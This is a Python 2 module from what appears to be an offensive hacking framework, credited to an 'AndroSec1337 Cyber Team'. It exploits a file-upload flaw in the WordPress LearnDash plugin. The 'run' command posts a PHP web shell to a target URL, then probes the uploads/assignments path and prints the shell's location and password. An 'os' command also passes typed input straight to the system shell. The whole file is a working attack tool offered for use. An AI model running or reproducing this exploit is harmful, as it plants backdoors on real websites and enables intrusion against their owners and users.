# -*- coding: utf-8 -*-

'''
Wordress Learndash  Exploit
Coded By ./Xi4u7
AndroSec1337 Cyber Team
https://facebook.com/Xi4u7
'''

import os
import subprocess
from core.wcolors import color
from core import help
from time import sleep
from core import log
from core import wcolors
from core import about
import requests
options = ["http://test.com/"]

def learndash1():
	try:
		line_1 = color.RED + "[" + color.CYAN + "XioChi" + color.RED + "]" +  color.ENDC
		line_1 += color.RED + "[" + color.CYAN + "wordpress/learndash" + color.RED + "]>> " + color.ENDC
		com = raw_input(line_1)
		com = com.lower()
		if com[0:10] =='set target':
			target_ip = com[11:40]
			options[0] = target_ip
			print color.RED + "[" + color.CYAN + "Target" + color.RED + "]>> " + options[0]
			learndash1()
		elif com[0:12] =='show options':
			print ""
			print wcolors.color.CYAN+"Options\t\t Value\t\t\tRQ\t Description"
			print wcolors.color.RED+"---------\t--------------\t\t------------------"
			print wcolors.color.CYAN+"Target\t\t"+options[0]+"\tyes\tTarget ip addres"
			learndash1()
		elif com[0:2] =='os':
			log.logger.single("Command Executed", "\n"+color.CYAN)
			os.system(com[3:])
			learndash1()
		elif com[0:4] =='help':
			help.help()
			learndash1()
		elif com[0:4] =='back':
			pass
		elif com[0:5] =='about':
			about.about()
			learndash1()
		elif com[0:3] =='run':
			log.logger.attack('Wordpress Learndash Exploit v1')
			file = open('core/shell/XioChi.php.php', 'rb')
			header = {'Content_type':'multipart/form-data','post':'foobar','course_id':'foobar','uploadfile':'foobar'}
			data = {'uploadfiles': file }
			url = options[0]
			try:
				gg = requests.post(url, headers=header, files=data)
				cek = requests.get(url+"/wp-content/uploads/assignments/XioChi.php.")
				if cek.status_code == "200":
					log.logger.attacksukses("Vulnerable")
					log.logger.attacksukses("Shell Path : /wp-content/uploads/assignments/XioChi.php.")
					log.logger.attacksukses("Password Shell : jancox")
				else:
					log.logger.error("Not Vulnerable! Exploiting Failed!")
			except Exception as e:
				print(e)
				learndash1()
		else:
			print color.RED + "[" + color.CYAN + "Wrong Command" + color.RED + "]>>" + com
			learndash1()
	except(KeyboardInterrupt):
		print ""
